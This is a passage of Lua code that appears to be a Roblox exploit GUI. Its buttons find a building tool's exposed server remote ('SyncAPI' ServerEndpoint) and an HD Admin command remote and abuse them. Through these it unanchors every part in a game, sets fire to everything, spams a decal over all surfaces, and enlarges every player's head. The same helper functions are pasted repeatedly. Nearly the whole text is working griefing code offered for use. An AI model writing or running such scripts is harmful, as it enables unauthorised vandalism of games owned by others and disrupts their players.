	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				--spawn(function()
				SetName(v,"Sky")
				AddMesh(v)
				--end)
				--spawn(function()
				SetMesh(v,"8006679977")
				SetTexture(v,id)
				--end)
				MeshResize(v,Vector3.new(50,50,50))
				SetLocked(v,true)
			end
		end
	end
	Sky("16028663795")

	-----------------------------------

	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	--craaa
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function spam(id)
		for i,v in game.workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetLocked(v,false)
					SpawnDecal(v,Enum.NormalId.Front)
					AddDecal(v,id,Enum.NormalId.Front)

					SpawnDecal(v,Enum.NormalId.Back)
					AddDecal(v,id,Enum.NormalId.Back)

					SpawnDecal(v,Enum.NormalId.Right)
					AddDecal(v,id,Enum.NormalId.Right)

					SpawnDecal(v,Enum.NormalId.Left)
					AddDecal(v,id,Enum.NormalId.Left)

					SpawnDecal(v,Enum.NormalId.Bottom)
					AddDecal(v,id,Enum.NormalId.Bottom)

					SpawnDecal(v,Enum.NormalId.Top)
					AddDecal(v,id,Enum.NormalId.Top)
				end)
			end
		end 
	end
	spam("16028663795")

	-----------

	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	--craaa
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = workspace.Part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function AddFire(part)
		local args = {
			[1] = "CreateDecorations",
			[2] = {
				[1] = {
					["Part"] = part,
					["DecorationType"] = "Fire"
				}
			}
		}
		_(args)
	end
	function FireParts()
		for i,v in game.Workspace:GetDescendants() do
			spawn(function()
				SetLocked(v,false)
				AddFire(v)
			end)
		end
	end
	FireParts()

	--------------
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.187, 0,0.175, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Disco"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";Disco")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.325, 0,0.175, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Fog"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";Fog")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.467, 0,0.175, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Create Baseplate"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 14
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent,types)
		local args = {
			[1] = "CreatePart",
			[2] = types,
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = workspace.Part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end

	function Material(part,mate)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Material"] = mate
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function toptexturecreate(part)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = Enum.NormalId.Top,
					["TextureType"] = "Texture"
				}
			}
		}

		_(args)
	end
	function toptextureadd(part)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = Enum.NormalId.Top,
					["TextureType"] = "Texture",
					["Texture"] = "rbxassetid://84215067005611",
					["StudsPerTileV"] = 50,
					["StudsPerTileU"] = 50,

				}
			}
		}
		_(args)
	end
	hrpx = math.floor(char.HumanoidRootPart.CFrame.x)
	hrpz = math.floor(char.HumanoidRootPart.CFrame.z)
	hrpy = math.floor(char.HumanoidRootPart.CFrame.y)
	function SpawnBasePlate()
		CreatePart(CFrame.new(hrpx,hrpy-20,hrpz),workspace,"Spawn")
		for i,v in game.Workspace:GetChildren() do
			if v:IsA("BasePart") and v.CFrame.y == hrpy - 20 and v.CFrame.x == hrpx then
				spawn(function()
					Resize(v,Vector3.new(500,10,500),CFrame.new(hrpx,hrpy-20,hrpz))
					Color(v,Color3.fromRGB(0,0,0))
					toptexturecreate(v)
					toptextureadd(v)
					while wait(1) do
						pcall(function()SetLocked(v,true)end)
					end
				end)
			end
		end
	end
	SpawnBasePlate()
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.615, 0,0.175, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "PBBV Decal"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function spam(id)
		for i,v in game.workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetLocked(v,false)
					SpawnDecal(v,Enum.NormalId.Front)
					AddDecal(v,id,Enum.NormalId.Front)

					SpawnDecal(v,Enum.NormalId.Back)
					AddDecal(v,id,Enum.NormalId.Back)

					SpawnDecal(v,Enum.NormalId.Right)
					AddDecal(v,id,Enum.NormalId.Right)

					SpawnDecal(v,Enum.NormalId.Left)
					AddDecal(v,id,Enum.NormalId.Left)

					SpawnDecal(v,Enum.NormalId.Bottom)
					AddDecal(v,id,Enum.NormalId.Bottom)

					SpawnDecal(v,Enum.NormalId.Top)
					AddDecal(v,id,Enum.NormalId.Top)
				end)
			end
		end 
	end
	spam("87514581053825")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.762, 0,0.175, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "UnAnchor"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = workspace.Part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end

	function Unanchor()
		for i,v in game.Workspace:GetDescendants() do
			spawn(function()
				SetLocked(v,false)
				SetAnchor(false,v)
			end)
		end
	end
	Unanchor()
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.047, 0,0.208, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Teams"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";Teams Z00NDKIDD")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.187, 0,0.207, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "BigHead"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local tool

	for _, v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	for _, v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	if not tool then return end

	local remote = tool.SyncAPI.ServerEndpoint

	function invokeServer(args)
		remote:InvokeServer(unpack(args))
	end

	function BigHead(player)
		local char = player.Character
		if char and char:FindFirstChild("Head") and char:FindFirstChild("Humanoid") then
			local head = char.Head
			if head:IsA("BasePart") then
				local existingMesh = head:FindFirstChildOfClass("SpecialMesh")
				if not existingMesh then
					local args = {
						[1] = "CreateMeshes",
						[2] = {
							[1] = {
								["Part"] = head
							}
						}
					}
					invokeServer(args)
				end

				local meshResizeArgs = {
					[1] = "SyncMesh",
					[2] = {
						[1] = {
							["Part"] = head,
							["Scale"] = Vector3.new(15, 15, 15)
						}
					}
				}
				invokeServer(meshResizeArgs)
			end
		end
	end

	for _, targetPlayer in ipairs(game.Players:GetPlayers()) do
		BigHead(targetPlayer)
	end

	game.Players.PlayerAdded:Connect(function(newPlayer)
		newPlayer.CharacterAdded:Connect(function()
			BigHead(newPlayer)
		end)
